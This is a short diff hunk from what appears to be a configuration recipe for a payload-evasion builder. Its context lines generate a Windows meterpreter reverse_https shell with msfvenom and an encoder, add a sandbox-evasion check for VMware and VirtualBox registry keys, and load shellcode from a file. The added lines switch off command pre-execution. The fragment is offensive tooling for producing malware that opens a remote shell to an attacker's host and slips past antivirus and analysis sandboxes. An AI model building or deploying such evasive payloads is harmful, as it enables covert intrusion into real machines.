@@ -25,6 +25,10 @@ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/s
 # add fopen sandbox evasion
 add_evasion has_vm_regkey 'VMWARE,VBOX,VIRTUAL,VMware'
 
+# no command preexec
+set_command_source none
+set_command_exec none
+
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
 
